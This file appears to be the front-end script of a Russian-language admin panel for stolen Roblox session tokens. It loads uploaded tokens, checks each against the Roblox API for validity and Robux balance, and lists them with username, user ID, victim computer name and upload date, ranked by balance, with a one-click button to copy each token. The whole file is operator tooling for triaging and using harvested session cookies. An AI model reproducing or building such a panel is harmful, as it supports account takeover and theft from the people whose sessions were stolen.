// ── Страница токенов (статическая версия) ─────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('headerSlot').innerHTML = renderHeader('tokens');
bindLogout();

let allTokens = [];
let currentSort = 'desc';

async function loadTokens() {
  const container = document.getElementById('tokensContainer');
  container.innerHTML = '<div class="loading">⏳ Проверка токенов через Roblox API...</div>';
  try {
    const r = await apiFetch('/tokens-data');
    allTokens = await r.json();
    sortTokens(currentSort);
    updateStats();
    toast('✅ Балансы обновлены');
  } catch (e) {
    if (e.message === 'auth') return;
    container.innerHTML = '<div class="empty">❌ Ошибка загрузки токенов</div>';
    toast('Ошибка загрузки', 'err');
  }
}

function updateStats() {
  const total = allTokens.length;
  const valid = allTokens.filter(t => t.valid).length;
  const totalRobux = allTokens.reduce((s, t) => s + (t.valid && t.robux !== null ? t.robux : 0), 0);
  const avg = valid > 0 ? Math.round(totalRobux / valid) : 0;
  document.getElementById('sTotal').textContent = total;
  document.getElementById('sValid').textContent = valid;
  document.getElementById('sTotalRobux').textContent = totalRobux.toLocaleString() + ' R$';
  document.getElementById('sAvgRobux').textContent = avg.toLocaleString() + ' R$';
}

function sortTokens(mode) {
  currentSort = mode;
  document.getElementById('sortDesc').className = 'sort-btn' + (mode === 'desc' ? ' active' : '');
  document.getElementById('sortAsc').className = 'sort-btn' + (mode === 'asc' ? ' active' : '');
  document.getElementById('sortDate').className = 'sort-btn' + (mode === 'date' ? ' active' : '');

  const sorted = [...allTokens].sort((a, b) => {
    if (mode === 'desc') {
      const av = a.valid && a.robux !== null ? a.robux : -1;
      const bv = b.valid && b.robux !== null ? b.robux : -1;
      return bv - av;
    }
    if (mode === 'asc') {
      const av = a.valid && a.robux !== null ? a.robux : Infinity;
      const bv = b.valid && b.robux !== null ? b.robux : Infinity;
      return av - bv;
    }
    return new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0);
  });
  renderTokens(sorted);
}

function renderTokens(tokens) {
  const container = document.getElementById('tokensContainer');
  if (tokens.length === 0) {
    container.innerHTML = '<div class="empty"><span class="empty-icon">🌌</span>Токенов пока нет</div>';
    return;
  }

  let html = '<table class="tokens-table"><thead><tr>';
  html += '<th>Статус</th>';
  html += '<th>Никнейм</th>';
  html += '<th>UserId</th>';
  html += '<th>Robux</th>';
  html += '<th>Токен</th>';
  html += '<th>Компьютер</th>';
  html += '<th>Дата</th>';
  html += '<th></th>';
  html += '</tr></thead><tbody>';

  for (const t of tokens) {
    const valid = t.valid;
    const robux = valid && t.robux !== null ? t.robux : null;
    const rowClass = valid ? '' : 'invalid';
    const statusBadge = valid
      ? '<span class="badge badge-valid">✅ Рабочий</span>'
      : '<span class="badge badge-invalid">❌ ' + escapeHtml(t.error || 'Невалид') + '</span>';
    const robuxDisplay = valid
      ? '<span class="robux">' + robux.toLocaleString() + ' R$</span>'
      : '<span class="robux invalid">—</span>';
    const safeTok = escapeHtml(t.security || '');
    html += '<tr class="' + rowClass + '">';
    html += '<td>' + statusBadge + '</td>';
    html += '<td>' + escapeHtml(t.username || t.user || '—') + '</td>';
    html += '<td>' + escapeHtml(t.userId || '—') + '</td>';
    html += '<td>' + robuxDisplay + '</td>';
    html += '<td><div class="token-cell" title="' + safeTok + '">' + (t.security ? escapeHtml(t.security.substring(0, 40)) + '...' : '—') + '</div></td>';
    html += '<td>' + escapeHtml(t.computer || '—') + '</td>';
    html += '<td>' + fmtDate(t.uploadedAt) + '</td>';
    html += '<td>' + (t.security ? '<button class="copy-btn" onclick="copyToken(' + JSON.stringify(t.security).replace(/"/g, '&quot;') + ')">📋 Копировать</button>' : '') + '</td>';
    html += '</tr>';
  }
  html += '</tbody></table>';
  container.innerHTML = html;
}

function copyToken(token) {
  if (!token) return;
  navigator.clipboard.writeText(token).then(() => toast('📋 Токен скопирован')).catch(() => {
    const ta = document.createElement('textarea'); ta.value = token; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); toast('📋 Токен скопирован');
  });
}

loadTokens();
